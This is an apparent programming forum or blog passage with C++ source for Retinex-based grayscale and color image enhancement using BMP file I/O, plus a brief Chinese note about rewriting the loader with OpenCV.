		sum1=(*pCur+*(pCur+1)+*(pCur+2)+*(pCur+width)+*(pCur+width+1)+*(pCur+width+2)+*(pCur+width*2)+*(pCur+width*2+1)+*(pCur+width*2+2));
		avg=(sum1-*(pCur+width+1))/8.0;
		nor=(*(pCur+width+1)-min+1)/double(max-min+1);
		*pData=(*(pCur+width+1)+(*(pCur+width+1)-avg)*pow((nor+EPSILON),DELTA)+0.5)*2048;
		pCur++;
		pData++;
		for(j=1;j<width-2;j++,pCur++,pData++)
		{
			min=*pCur;
			max=*pCur;
			for(k=0;k<3;k++)
			{
				for(s=0;s<3;s++)
				{
					if(*(pCur+k*width+s)<min) min=*(pCur+k*width+s);
					else if(*(pCur+k*width+s)>max) max=*(pCur+k*width+s);
				}
				sum1=sum1-*(pCur+k*width-1)+*(pCur+k*width+2);
			}
			//	avg=((*(sum+(i+3)*width+j+3)-*(sum+i*width+j+3)-*(sum+(i+3)*width+j)+*(sum+i*width+j))-*(pCur+width+1))/8.0;
			//	avg=(*pCur+*(pCur+1)+*(pCur+2)+*(pCur+width)+*(pCur+width+2)+*(pCur+width*2)+*(pCur+width*2+1)+*(pCur+width*2+2))/8.0; //  s/8.0*256
			avg=(sum1-*(pCur+width+1))/8.0;
			nor=(*(pCur+width+1)-min+1)/double(max-min+1);
			*pData=(*(pCur+width+1)+(*(pCur+width+1)-avg)*pow((nor+EPSILON),DELTA)+0.5)*2048;
		}
	}
	delete sum;
	return;
}
//////////////////////////
//  Gaussian Template
//////////////////////////
void GaussianTemplate(int *Template,int Tsize,double c)
{
	int *pCur;
	double Lemda,c1=c*c;
	int i,j;
	Lemda=0;
	for(pCur=Template,i=-((Tsize-1)>>1);i<=((Tsize-1)>>1);i++)
	{
		for(j=-((Tsize-1)>>1);j<=((Tsize-1)>>1);j++,pCur++)
		{
			*pCur=(exp(-(i*i+j*j)/c1))*2048;
			Lemda+=*pCur;
		}
	}
	Lemda=2048.0/Lemda;
	for(pCur=Template,i=0;i<Tsize*Tsize;i++,pCur++)
	{
		*pCur=Lemda*(*pCur);
	}

	return;
}

//////////////////////////
//  3*3 Gaussian Template
//////////////////////////
void GaussianTemplate2(int *Template,double c)
{
	int *pCur;
	double Lemda,c1=c*c;
	int i,j;
	Lemda=1.0/sqrt(c*c*PI)*0.7*2048;
	for(pCur=Template,i=-1;i<=1;i++)
	{
		for(j=-1;j<=1;j++)
		{
			*pCur++=Lemda*exp(-(i*i+j*j)/c1);
		}

	}
	return;
}

//////////////////////////
// 单尺度Retinex
// OrgImg: point to  original image
// widht: the width of the image
// height: the height of the image
// ResImg: point to the result image
//////////////////////////
void SSR(int *LogImg,BYTE *OrgImg,int width,int height,int *ResData,int *Template,int Tsize)
{
	BYTE *pCur=OrgImg;
	int i,j,k,s,size=width*height;
	int temp,*pData,*pCtr,*ptmp,*pRes,temp2;
	double r=1.0/GAMMA;
	memset(ResData,0,sizeof(int)*width*height);
	pRes=ResData+((Tsize-1)/2)*width+((Tsize-1)/2);
	pCtr=LogImg+((Tsize-1)/2)*width+((Tsize-1)/2);
	ptmp=Template;
	for(i=(Tsize-1)/2;i<height-((Tsize-1)/2);i++,pRes+=Tsize-1,pCtr+=Tsize-1,pCur+=Tsize-1)
	{
		for(j=(Tsize-1)/2;j<width-((Tsize-1)/2);j++,pRes++,pCtr++,pCur++)
		{
			temp=0;
			ptmp=Template;
			for(k=0;k<Tsize;k++)
			{
				for(s=0;s<Tsize;s++)
				{
					temp+=(*(pCur+k*width+s)*(*ptmp++));
				}
			}
			if(temp==0) *pRes=exp(pow(*pCtr>>11,r));
			else 
			{
				temp2=(*pCtr)-(log(float(temp>>22)))*2048;
				if(temp2>0) *pRes=(exp(pow((temp2>>11),r)))*2048+(temp>>11);
				else if(temp2<0) *pRes=exp(0-pow(0-(temp2>>11),r))*2048+(temp>>11);
				else *pRes=(temp>>11);
			}
		}
	}
	//四边不处理
	for(i=0,pRes=ResData,pCur=OrgImg;i<width*(Tsize-1)/2;i++,pCur++,pRes++)
	{
		*pRes=*pCur;
	}
	for(i=(Tsize-1)/2;i<height-(Tsize-1)/2;i++)
	{
		for(j=0;j<(Tsize-1)/2;j++)
		{
			*pRes++=*pCur++;
		}
		pRes+=width-(Tsize-1);
		pCur+=width-(Tsize-1);
		for(j=0;j<(Tsize-1)/2;j++)
		{
			*pRes++=*pCur++;
		}
	}
	for(i=0;i<width*(Tsize-1)/2;i++)
	{
		*pRes++=*pCur++;
	}
	return;
}
/////////////////////////
//  Get Mean And Deviance
/////////////////////////
void GetMeanAndDeviance(int *Temp,int width,int height,int Tsize,int *mean,int *dev)
{
	int i,j,size;
	size=(width-(Tsize-1))*(height-(Tsize-1));
	int *t;
	long double sum;
	for(t=Temp+(Tsize-1)/2*width+(Tsize-1)/2,sum=0,i=(Tsize-1)/2;i<(height-(Tsize-1)/2);i++,t+=Tsize-1)
	{
		for(j=(Tsize-1)/2;j<width-(Tsize-1)/2;j++)
		{
			sum+=*t++;			
		}
	}
	*mean=sum/size;
	for(t=Temp+(Tsize-1)/2*width+(Tsize-1)/2,sum=0,i=(Tsize-1)/2;i<height-(Tsize-1)/2;i++,t+=Tsize-1)
	{
		for(j=(Tsize-1)/2;j<width-(Tsize-1)/2;j++)
		{
			sum+=pow(float(*t-*mean),2);
		}
	}
	*dev=sqrt(sum/size);
	return;
}

/////////////////////////
//  Linear Stretch
// Temp: point to the image before stratching
// widht: the width of the image
// height: the height of the image
// ResImg: point to the resultant image
/////////////////////////
void LinearStretch(int *Temp,int width,int height,int *mean,int *dev,BYTE *ResImg)
{
	BYTE *pRes;
	int *t,min,max,temp,c;
	int i,size=width*height;
	min=*mean-3*(*dev);
	max=*mean+3*(*dev);
	c=255.0/(max-min)*2048;
	for(pRes=ResImg,t=Temp,i=0;i<size;i++,t++,pRes++)
	{
		temp=((*t-min)*c)>>11;
		if(temp>255) *pRes=255;
		else if(temp<0) *pRes=0;
		else *pRes=temp;
	}

	return;
}

/*
//////////////////////////
// GAMMA Correction
//////////////////////////
void GammaCorrection(double *OrgData,int width,int heihgt,double *ResData)
{
int i,size;
double *pOrg,*pRes;
for(i=0,pOrg=OrgDat,pRes=ResData;i<size;i++)
{
*pRes++=pow(*pOrg++,1.0/GAMMA);
} 
}
*/
//////////////////////////
// Contrast
//////////////////////////
void Contrast(BYTE *OrgImg,int x,int y,int width,int height,int blockw,int blockh,double &wcontrast,double &mcontrast)
{
	BYTE *pCur=OrgImg+x*blockw+y*width*blockh;
	double min=10000,max=-1;
	int i,j;

	for(i=0;i<blockh;i++,pCur=pCur+width-blockw)
	{
		for(j=0;j<blockw;j++,pCur++)
		{
			if(*pCur<min) min=*pCur;
			if(*pCur>max) max=*pCur;
		}
	}
	mcontrast=(max-min+1)/(max+min+1);
	if(min==0) wcontrast=(max+5)/(min+5);
	else wcontrast=max/min;

	return;
}

//////////////////////////
//  Measure of Performance
//////////////////////////
void Measure(BYTE *ResImg,int width,int height,double &emee,double &ame)
{
	int k1=8,k2=8,i,j,blockw,blockh;
	double wcontrast,mcontrast;
	blockw=width/k2;
	blockh=height/k1;
	emee=0;
	ame=0;
	for(i=0;i<k1;i++)
	{
		for(j=0;j<k2;j++)
		{
			Contrast(ResImg,i,j,width,height,blockw,blockh,wcontrast,mcontrast);
			emee+=pow(wcontrast,ALPHA_c)*log(wcontrast);
			ame+=pow(mcontrast,ALPHA_c)*log(mcontrast);
		}
	}
	emee=ALPHA_c*emee/(k1*k2);
	ame=ALPHA_c*ame/(k1*k2);
	return ;
}

/////////////////////////
// Gray Image Process
/////////////////////////
void GrayImageProcess(BYTE *OrgImg,int width,int height,BYTE *ResImg)
{
	int *Data,*LogImg,*Template,mean,dev;
	int Tsize;
	double c;
	Tsize=5;
	c=20;
	Template=new int[Tsize*Tsize];
	Data=new int[width*height];
	LogImg=new int[width*height];
	LocalNonlinearStretch(OrgImg,width,height,Data);	
	LogarithmTransform(Data,width,height,LogImg);
	//GaussianTemplate(Template,Tsize,c);
	GaussianTemplate2(Template,0.5);Tsize=3;
	SSR(LogImg,OrgImg,width,height,Data,Template,Tsize);
	GetMeanAndDeviance(Data,width,height,Tsize,&mean,&dev);
	LinearStretch(Data,width,height,&mean,&dev,ResImg);
	delete Template;
	delete Data;
	delete LogImg;
	return;
}

/////////////////////////
// Color Image Process
/////////////////////////
void ColorImageProcess(BYTE *OrgImg,int width,int height,BYTE *ResImg)
{
	BYTE *Value;
	int i,j,Tsize,temp;
	int *Data,*LogImg,*Template,*Percent,mean,dev;
	double c,emee,ame;
	Tsize=5;
	c=0.75;
	Template=new int[Tsize*Tsize];
	Data=new int[width*height];
	LogImg=new int[width*height];
	Percent=new int[width*height*3];
	Value=new BYTE[width*height];
	memset(Value,0,sizeof(BYTE)*width*height);
	for(j=0;j<width*height;j++)
	{  
		temp=0;
		for(i=0;i<3;i++)
		{ 
			temp+=*(OrgImg+j*3+i);
		}
		for(i=0;i<3;i++)
		{ 
			*(Percent+j*3+i)=*(OrgImg+j*3+i)/double(temp)*2048;
			*(Value+j)+=(*(OrgImg+j*3+i)*(*(Percent+j*3+i)))>>11;
		}
	}
	LocalNonlinearStretch(Value,width,height,Data);
	LogarithmTransform(Data,width,height,LogImg);
	//  GaussianTemplate(Template,Tsize,c);
	GaussianTemplate2(Template,0.5);Tsize=3;
	SSR(LogImg,Value,width,height,Data,Template,Tsize);
	GetMeanAndDeviance(Data,width,height,Tsize,&mean,&dev);
	LinearStretch(Data,width,height,&mean,&dev,Value);
	for(j=0;j<width*height;j++)
	{
		for(i=0;i<3;i++)
		{ 
			temp=(*(Percent+j*3+i)*(*(Value+j))*3)>>11;
			if(temp>255) *(ResImg+j*3+i)=255;
			else *(ResImg+j*3+i)=temp;
		}
	}
	printf("*****彩色图像三通道联合处理结果******************\n");
	Measure(Value,width,height,emee,ame);
	cout<<"EMEE:"<<emee<<endl;
	delete Template;
	delete Data;
	delete LogImg;
	delete Value;
	delete Percent;
	return;
}


//////////////////////////
//  Color Image process 2
//  三通道分别处理
//////////////////////////
void ColorImageProcess2(BYTE *OrgImg,int width,int height,BYTE *ResImg)
{
	BYTE *Value;
	int i,j,Tsize;
	int *Data,*LogImg,*Template,mean,dev;
	double c,emee=0,ame=0,x1,x2;
	Tsize=5;
	c=0.5;
	Template=new int[Tsize*Tsize];
	Value=new BYTE[width*height];	
	Data=new int[width*height];
	LogImg=new int[width*height];
	GaussianTemplate(Template,Tsize,c);
	//      GaussianTemplate2(Template,0.5);	Tsize=3;
	for(i=0;i<3;i++)
	{
		for(j=0;j<width*height;j++)
		{
			*(Value+j)=*(OrgImg+j*3+i);
		}
		LocalNonlinearStretch(Value,width,height,Data);
		LogarithmTransform(Data,width,height,LogImg);
		SSR(LogImg,Value,width,height,Data,Template,Tsize);	
		GetMeanAndDeviance(Data,width,height,Tsize,&mean,&dev);
		LinearStretch(Data,width,height,&mean,&dev,Value);
		Measure(Value,width,height,x1,x2);
		emee+=x1;
		ame+=x2;
		for(j=0;j<width*height;j++)
		{
			*(ResImg+j*3+i)=*(Value+j);
		}
	}
	printf("*****彩色图像三通道分别处理结果******************\n");
	cout<<"EMEE:"<<emee/3.0<<endl;		
	delete Template;
	delete Value;
	delete Data;
	delete LogImg;
	return;
}
//////////////////////////
//  main
//////////////////////////
int main()
{   
	BYTE *OrgImg,*ResImg,*p1,*p2;
	int width,height,i,j,suc,area1,area2,Tsize;
	bool isRGB,ret;
	clock_t t1,t2;
	double emee,ame;
	char ch;
	int *offsetdata=new int[2];
	for(i=0;i<2;i++)
	{
		*(offsetdata+i)=0X80808080;
	}    
	system( "cls" );	
	printf("******中心/环绕Retienx算法******************\n");
	printf("       1.处理灰度图像\n");
	printf("       2.处理彩色图像\n");
	printf("*********************************************\n");
	printf("请选择(1或2): ");	
	do
	{
		cin>>ch; 
	}while( ch != '1' && ch != '2');

	//system ( "cls" );


	if ( ch == '1')
		isRGB=false;
	else if ( ch == '2')
		isRGB=true;
	// open file

	string image_name;
	cout<<endl<<"输入图像名：";
	cin>>image_name;

	//Mat image_dst;

	//if (!isRGB)
	//{
	//	image_dst = imread(image_name,0);
	//}
	//else
	//{
	//	image_dst = imread(image_name,1);
	//}

	//
	//
	//if(image_dst.empty())
	//{
	//	return -1;
	//} //是否加载成功

	//imshow(image_name,image_dst);
	//

	// width = image_dst.cols;  
	// height = image_dst.rows;  
	//int channel = image_dst.channels(); 
	// int step = width * channel* 1;
	//uchar* ps = NULL;
	//
	//p1 = new BYTE[width*height*channel+8];

	//for (int i = 0; i < height; i++)  
	//{  
	//	ps = image_dst.ptr<uchar>(i);  
	//	for (int j = 0; j < width; j++)  
	//	{  
	//		if (1 == channel)  
	//		{  
	//			*(p1 + i*step + j) = ps[j];  
	//			
	//		}  
	//		else if (3 == channel)  
	//		{  
	//			*(p1 + i*step + j*3) = ps[j*3 + 2];  
	//			*(p1 + i*step + j*3 + 1) = ps[j*3 + 1];  
	//			*(p1 + i*step + j*3 + 2) = ps[j*3];  
	//		}  
	//	}  
	//}  


	if(!isRGB)
	p1=Read8BitBmpFile2Img(image_name.c_str(),&width,&height);
	else
	p1=Read24BitBmpFile2Img(image_name.c_str(),&width,&height);
	

	if (p1==NULL)
	{  
		printf("*fopen err!\n");
		delete p1;
		return 0;
	}
	if(width%64!=0||height%64!=0)
	{
		cout<<"图像大小需是64的倍数"<<endl;
		delete p1;
		return 0;
	}

	area1=width*height;

	if(!isRGB)
	{
		OrgImg=p1+8-int(p1)%8;	
		p2=new BYTE[width*height+8];
		ResImg=p2+8-int(p2)%8;
		t2=clock();
		GrayImageProcess(OrgImg,width,height,ResImg);
		t1=clock();
		printf("*****灰度图像处理结果******************\n");
		cout<<"运行时间："<<t1-t2<<"ms"<<endl;
		Measure(ResImg,width,height,emee,ame);
		cout<<"EMEE:"<<emee<<endl;
		suc=Write8BitImg2BmpFile(ResImg,width,height,"result_1.bmp");
	}
	else
	{	
		OrgImg=p1+8-int(p1)%8;	
		p2=new BYTE[width*height*3+8];		
		ResImg=p2+8-int(p2)%8;
		t2=clock();
		ColorImageProcess(OrgImg,width,height,ResImg);
		t1=clock();
		cout<<"运行时间："<<t1-t2<<"ms"<<endl;
		t2=clock();
		suc=Write24BitImg2BmpFile(ResImg,width,height,"result_1.bmp");
		ColorImageProcess2(OrgImg,width,height,ResImg);
		t1=clock();
		cout<<"运行时间："<<t1-t2<<"ms"<<endl;
		suc=Write24BitImg2BmpFile(ResImg,width,height,"result_2.bmp");
	}
	if(suc==-1)
	{
		printf("*fwrite err!\n");  
	}

	Mat result1 = imread("result_1.bmp",1);
	Mat result2 = imread("result_2.bmp",1);

	imshow("result1",result1);
	imshow("result2",result2);
	//release mem
	delete p1;
	delete p2;
	

	waitKey(0);
	return 0;
}





 
 
后面用opencv改写了一下主要想把像素数据写到BYTE *指向的内存空间中，这样的话可以加载其他格式的图像文件了:但是出现了一些问题，可能跟之前作者代码里面的限制有关，必须是64的倍数。还写了一个功能实现把像素数据写到txt中保存下来，各位凑活看。
参见帖子：
http://bbs.csdn.net/topics/391005171
http://bbs.csdn.net/topics/391004682
 
代码如下：
 
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <cmath>
#include <time.h>
#include <iostream>

#include "opencv2/core/core.hpp"
#include "opencv2/highgui/highgui.hpp"
#include "opencv2/imgproc/imgproc.hpp"

#pragma comment(lib,"opencv_core2410d.lib")                  
#pragma comment(lib,"opencv_highgui2410d.lib")                  
#pragma comment(lib,"opencv_imgproc2410d.lib")  


using namespace std; 
using namespace cv;

#define EPSILON 1
#define DELTA 1
#define GAMMA 0.9	
#define PI 3.1415926
#define ALPHA_c 1

int size_mem = 0;

//////////////////////////
//  Read a 8 bit bmp File
//////////////////////////
BYTE *Read8BitBmpFile2Img(const char * filename,int *width,int *height)
{   FILE * BinFile;
BITMAPFILEHEADER FileHeader;
BITMAPINFOHEADER BmpHeader;
BYTE *img;
int size;
int Suc=1;
// Open File
*width=*height=0;
if((BinFile=fopen(filename,"rb"))==NULL) return NULL;
// Read Struct Info
if (fread((void *)&FileHeader,1,sizeof(FileHeader),BinFile)!=sizeof(FileHeader)) Suc=-1;
if (fread((void *)&BmpHeader,1,sizeof(BmpHeader),BinFile)!=sizeof(BmpHeader)) Suc=-1;
if (Suc==-1) { fclose(BinFile); return NULL; }
// Read Image Data
*width=(BmpHeader.biWidth+3)/4*4;
*height=BmpHeader.biHeight;
size=(BmpHeader.biWidth+3)/4*4*BmpHeader.biHeight;
fseek(BinFile,FileHeader.bfOffBits,SEEK_SET);
if ( (img=new BYTE[size+8])!=NULL)
{   if(fread(img+8-int(img)%8,sizeof(BYTE),size,BinFile)!=(unsigned int)size)
{ fclose(BinFile);
delete img;
img=NULL;
return NULL;
}
}
fclose(BinFile);
return img;
}

/////////////////////////
// Write a 8 bit bmp File
/////////////////////////
int Write8BitImg2BmpFile(BYTE *img,int width,int height,const char * filename)
{   FILE * BinFile;
BITMAPFILEHEADER FileHeader;
BITMAPINFOHEADER BmpHeader;
BYTE p[4];
int i,Suc=1;

// Open File
if((BinFile=fopen(filename,"w+b"))==NULL) {  return -1; }
//  Fill the FileHeade)
FileHeader.bfType= ((WORD) ('M' << 8) | 'B');
FileHeader.bfOffBits=sizeof(BITMAPFILEHEADER)+sizeof(BmpHeader)+256*4L;
FileHeader.bfSize=FileHeader.bfOffBits+width*height ;
FileHeader.bfReserved1=0;
FileHeader.bfReserved2=0;
if (fwrite((void *)&FileHeader,1,sizeof(FileHeader),BinFile)!=sizeof(FileHeader)) Suc=-1;
// Fill the ImgHeader
BmpHeader.biSize = 40;
BmpHeader.biWidth = width;
BmpHeader.biHeight = height;
BmpHeader.biPlanes = 1 ;
BmpHeader.biBitCount = 8 ;
BmpHeader.biCompression = 0 ;
BmpHeader.biSizeImage = 0 ;
BmpHeader.biXPelsPerMeter = 0;
BmpHeader.biYPelsPerMeter = 0;
BmpHeader.biClrUsed = 0;
BmpHeader.biClrImportant = 0;
if (fwrite((void *)&BmpHeader,1,sizeof(BmpHeader),BinFile)!=sizeof(BmpHeader)) Suc=-1;
// write Pallete
for (i=0,p[3]=0;i<256;i++) 
{  
	p[3]=0;
	p[0]=p[1]=p[2]=i; // blue,green,red;
	if (fwrite((void *)p,1,4,BinFile)!=4) { Suc=-1; break; }
}
// write image data
if (fwrite((void *)img,1,width*height,BinFile)!=(unsigned int) width*height) Suc=-1;
// return;
fclose(BinFile);
return Suc;
}

//////////////////////////
//  Read a 24 bit bmp File
//////////////////////////
BYTE *Read24BitBmpFile2Img(const char * filename,int *width,int *height)
{  
	FILE * BinFile;
	BITMAPFILEHEADER FileHeader;
	BITMAPINFOHEADER BmpHeader;
	BYTE *img;
	int size;
	int Suc=1;

	// Open File
	*width=*height=0;
	if((BinFile=fopen(filename,"rb"))==NULL) return NULL;
	// Read Struct Info
	if (fread((void *)&FileHeader,1,sizeof(FileHeader),BinFile)!=sizeof(FileHeader)) Suc=-1;
	if (fread((void *)&BmpHeader,1,sizeof(BmpHeader),BinFile)!=sizeof(BmpHeader)) Suc=-1;
	if (Suc==-1) { fclose(BinFile); return NULL; }
	// Read Image Data
	*width=(BmpHeader.biWidth+3)/4*4;
	*height=BmpHeader.biHeight;
	size=(*width)*(*height)*3;
	fseek(BinFile,FileHeader.bfOffBits,SEEK_SET);
	if ( (img=new BYTE[size+8])!=NULL)
	{   
		//size_mem = *((int *)img - 1);
		if(fread(img+8-int(img)%8,sizeof(BYTE),size,BinFile)!=(unsigned int)size)
		{ 
			fclose(BinFile);
			delete img;
			img=NULL;
			return NULL;
		}
	}
	fclose(BinFile);
	return img;
}
//////////////////////////
//  write a 24 bit bmp File
//////////////////////////
bool Write24BitImg2BmpFile(BYTE *img,int width,int height,const char * filename)
{   
	FILE * BinFile;
	BITMAPFILEHEADER FileHeader;
	BITMAPINFOHEADER BmpHeader;
	bool Suc=true;
	int y,i,extend;
	BYTE *pCur;

	// Open File
	if((BinFile=fopen(filename,"w+b"))==NULL) {  return false; }
	// Fill the FileHeader
	FileHeader.bfType= ((WORD) ('M' << 8) | 'B');
	FileHeader.bfOffBits=sizeof(BITMAPFILEHEADER)+sizeof(BmpHeader);
	FileHeader.bfSize=FileHeader.bfOffBits+width*height*3L ;
	FileHeader.bfReserved1=0;
	FileHeader.bfReserved2=0;
	if (fwrite((void *)&FileHeader,1,sizeof(FileHeader),BinFile)!=sizeof(FileHeader)) Suc=false;
	// Fill the ImgHeader
	BmpHeader.biSize = 40;
	BmpHeader.biWidth = width;
	BmpHeader.biHeight = height;
	BmpHeader.biPlanes = 1 ;
	BmpHeader.biBitCount = 24 ;
	BmpHeader.biCompression = 0 ;
	BmpHeader.biSizeImage = 0 ;
	BmpHeader.biXPelsPerMeter = 0;
	BmpHeader.biYPelsPerMeter = 0;
	BmpHeader.biClrUsed = 0;
	BmpHeader.biClrImportant = 0;
	if (fwrite((void *)&BmpHeader,1,sizeof(BmpHeader),BinFile)!=sizeof(BmpHeader)) Suc=false;
	// write image data
	extend=(width+3)/4*4-width;
	if (extend==0)
	{   
		if (fwrite((void *)img,1,width*height*3,BinFile)!=(unsigned int)3*width*height) Suc=false;
	}
	else
	{   
		for(y=0,pCur=img;y<height;y++,pCur+=3*width)
		{   
			if (fwrite((void *)pCur,1,width*3,BinFile)!=(unsigned int)3*width) Suc=false; // 真实的数据
			for(i=0;i<extend;i++) // 扩充的数据
			{ 
				if (fwrite((void *)(pCur+3*(width-1)+0),1,1,BinFile)!=1) Suc=false;
				if (fwrite((void *)(pCur+3*(width-1)+1),1,1,BinFile)!=1) Suc=false;
				if (fwrite((void *)(pCur+3*(width-1)+2),1,1,BinFile)!=1) Suc=false;
			}
		}
	}
	// return;
	fclose(BinFile);
	return Suc;
}

//////////////////////////
// Logarithm Transform
// OrgImg: point to original image
// widht: the width of the image
// height:the height of the image
// LogImg: point to logarithm transform  of the image
//////////////////////////
void LogarithmTransform(int *OrgImg,int width,int height,int *LogImg)
{
	int *pLog=LogImg,*pCur=OrgImg;
	int i,size,temp;
	size=width*height;
	for(i=0;i<size;i++)
	{
		temp=*pCur++;
		if(temp==0) *pLog++=0;
		else *pLog++=log(float(temp))*2048;
	}
	return;
}
////////////////////////////////
//  计算窗口内像素灰度和
////////////////////////////////
void Ini(BYTE *pOrgImg,int width,int height,int *sum)
{
	int i,j;
	BYTE *pCur;
	pCur=pOrgImg;
	*sum=*pCur;
	for(i=1;i<height;i++)
		*(sum+i*width)=*(sum+(i-1)*width)+*(pCur+i*width);
	for(j=1;j<width;j++)
		*(sum+j)=*(sum+j-1)+*(pCur+j);
	for(i=1;i<height;i++)
	{
		for(j=1;j<width;j++) 
		{
			*(sum+i*width+j)=*(sum+(i-1)*width+j)+*(sum+i*width+j-1)-*(sum+(i-1)*width+j-1)+*(pCur+i*width+j); //卷积计算
		}
	}
	return;
}

//////////////////////////
// 局部非线性对比度增强
//////////////////////////
void LocalNonlinearStretch(BYTE *OrgImg,int width,int height,int *ResData)
{
	int i,j,k,s,size=width*height;
	int *pData,*sum,sum1;
	double avg,min,max,nor;
	BYTE *pCur=OrgImg;
	sum=new int[width*height];
	pData=ResData+width+1;
	//	Ini(OrgImg,width,height,sum);
	for(i=0;i<height-2;i++,pCur+=2,pData+=2)
	{
		min=*pCur;
		max=*pCur;
		for(k=0;k<3;k++)
		{
			for(s=0;s<3;s++)
			{
				if(*(pCur+k*width+s)<min) min=*(pCur+k*width+s);
				else if(*(pCur+k*width+s)>max) max=*(pCur+k*width+s);
			}
		}	
		sum1=(*pCur+*(pCur+1)+*(pCur+2)+*(pCur+width)+*(pCur+width+1)+*(pCur+width+2)+*(pCur+width*2)+*(pCur+width*2+1)+*(pCur+width*2+2));
		avg=(sum1-*(pCur+width+1))/8.0;
		nor=(*(pCur+width+1)-min+1)/double(max-min+1);
		*pData=(*(pCur+width+1)+(*(pCur+width+1)-avg)*pow((nor+EPSILON),DELTA)+0.5)*2048;
		pCur++;
		pData++;
		for(j=1;j<width-2;j++,pCur++,pData++)
		{
			min=*pCur;
			max=*pCur;
			for(k=0;k<3;k++)
			{
				for(s=0;s<3;s++)
				{
					if(*(pCur+k*width+s)<min) min=*(pCur+k*width+s);
					else if(*(pCur+k*width+s)>max) max=*(pCur+k*width+s);
				}
				sum1=sum1-*(pCur+k*width-1)+*(pCur+k*width+2);
			}
			//	avg=((*(sum+(i+3)*width+j+3)-*(sum+i*width+j+3)-*(sum+(i+3)*width+j)+*(sum+i*width+j))-*(pCur+width+1))/8.0;
			//	avg=(*pCur+*(pCur+1)+*(pCur+2)+*(pCur+width)+*(pCur+width+2)+*(pCur+width*2)+*(pCur+width*2+1)+*(pCur+width*2+2))/8.0; //  s/8.0*256
			avg=(sum1-*(pCur+width+1))/8.0;
			nor=(*(pCur+width+1)-min+1)/double(max-min+1);
			*pData=(*(pCur+width+1)+(*(pCur+width+1)-avg)*pow((nor+EPSILON),DELTA)+0.5)*2048;
		}
	}
	delete sum;
	return;
}
//////////////////////////
//  Gaussian Template
//////////////////////////
void GaussianTemplate(int *Template,int Tsize,double c)
{
	int *pCur;
	double Lemda,c1=c*c;
	int i,j;
	Lemda=0;
	for(pCur=Template,i=-((Tsize-1)>>1);i<=((Tsize-1)>>1);i++)
	{
		for(j=-((Tsize-1)>>1);j<=((Tsize-1)>>1);j++,pCur++)
		{
			*pCur=(exp(-(i*i+j*j)/c1))*2048;
			Lemda+=*pCur;
		}
	}
	Lemda=2048.0/Lemda;
	for(pCur=Template,i=0;i<Tsize*Tsize;i++,pCur++)
	{
		*pCur=Lemda*(*pCur);
	}

	return;
}

//////////////////////////
//  3*3 Gaussian Template
//////////////////////////
void GaussianTemplate2(int *Template,double c)
{
	int *pCur;
	double Lemda,c1=c*c;
	int i,j;
	Lemda=1.0/sqrt(c*c*PI)*0.7*2048;
	for(pCur=Template,i=-1;i<=1;i++)
	{
		for(j=-1;j<=1;j++)
		{
			*pCur++=Lemda*exp(-(i*i+j*j)/c1);
		}

	}
	return;
}

//////////////////////////
// 单尺度Retinex
// OrgImg: point to  original image
// widht: the width of the image
// height: the height of the image
// ResImg: point to the result image
//////////////////////////
void SSR(int *LogImg,BYTE *OrgImg,int width,int height,int *ResData,int *Template,int Tsize)
{
	BYTE *pCur=OrgImg;
	int i,j,k,s,size=width*height;
	int temp,*pData,*pCtr,*ptmp,*pRes,temp2;
	double r=1.0/GAMMA;
	memset(ResData,0,sizeof(int)*width*height);
	pRes=ResData+((Tsize-1)/2)*width+((Tsize-1)/2);
	pCtr=LogImg+((Tsize-1)/2)*width+((Tsize-1)/2);
	ptmp=Template;
	for(i=(Tsize-1)/2;i<height-((Tsize-1)/2);i++,pRes+=Tsize-1,pCtr+=Tsize-1,pCur+=Tsize-1)
	{
		for(j=(Tsize-1)/2;j<width-((Tsize-1)/2);j++,pRes++,pCtr++,pCur++)
		{
			temp=0;
			ptmp=Template;
			for(k=0;k<Tsize;k++)
			{
				for(s=0;s<Tsize;s++)
				{
					temp+=(*(pCur+k*width+s)*(*ptmp++));
				}
			}
			if(temp==0) *pRes=exp(pow(*pCtr>>11,r));
			else 
			{
				temp2=(*pCtr)-(log(float(temp>>22)))*2048;
				if(temp2>0) *pRes=(exp(pow((temp2>>11),r)))*2048+(temp>>11);
				else if(temp2<0) *pRes=exp(0-pow(0-(temp2>>11),r))*2048+(temp>>11);
				else *pRes=(temp>>11);
			}
		}
	}
	//四边不处理
	for(i=0,pRes=ResData,pCur=OrgImg;i<width*(Tsize-1)/2;i++,pCur++,pRes++)
	{
		*pRes=*pCur;
	}
	for(i=(Tsize-1)/2;i<height-(Tsize-1)/2;i++)
	{
		for(j=0;j<(Tsize-1)/2;j++)
		{
			*pRes++=*pCur++;
		}
		pRes+=width-(Tsize-1);
		pCur+=width-(Tsize-1);
		for(j=0;j<(Tsize-1)/2;j++)
		{
			*pRes++=*pCur++;
		}
	}
	for(i=0;i<width*(Tsize-1)/2;i++)
	{
		*pRes++=*pCur++;
	}
	return;
}
/////////////////////////
//  Get Mean And Deviance
/////////////////////////
void GetMeanAndDeviance(int *Temp,int width,int height,int Tsize,int *mean,int *dev)
{
	int i,j,size;
	size=(width-(Tsize-1))*(height-(Tsize-1));
	int *t;
	long double sum;
	for(t=Temp+(Tsize-1)/2*width+(Tsize-1)/2,sum=0,i=(Tsize-1)/2;i<(height-(Tsize-1)/2);i++,t+=Tsize-1)
	{
		for(j=(Tsize-1)/2;j<width-(Tsize-1)/2;j++)
		{
			sum+=*t++;			
		}
	}
	*mean=sum/size;
	for(t=Temp+(Tsize-1)/2*width+(Tsize-1)/2,sum=0,i=(Tsize-1)/2;i<height-(Tsize-1)/2;i++,t+=Tsize-1)
	{
		for(j=(Tsize-1)/2;j<width-(Tsize-1)/2;j++)
		{
			sum+=pow(float(*t-*mean),2);
		}
	}
	*dev=sqrt(sum/size);
	return;
}

/////////////////////////
//  Linear Stretch
// Temp: point to the image before stratching
// widht: the width of the image
// height: the height of the image
// ResImg: point to the resultant image
/////////////////////////
void LinearStretch(int *Temp,int width,int height,int *mean,int *dev,BYTE *ResImg)
{
	BYTE *pRes;
	int *t,min,max,temp,c;
	int i,size=width*height;
	min=*mean-3*(*dev);
	max=*mean+3*(*dev);
	c=255.0/(max-min)*2048;
	for(pRes=ResImg,t=Temp,i=0;i<size;i++,t++,pRes++)
	{
		temp=((*t-min)*c)>>11;
		if(temp>255) *pRes=255;
		else if(temp<0) *pRes=0;
		else *pRes=temp;
	}

	return;
}

/*
//////////////////////////
// GAMMA Correction
//////////////////////////
void GammaCorrection(double *OrgData,int width,int heihgt,double *ResData)
{
int i,size;
double *pOrg,*pRes;
for(i=0,pOrg=OrgDat,pRes=ResData;i<size;i++)
{
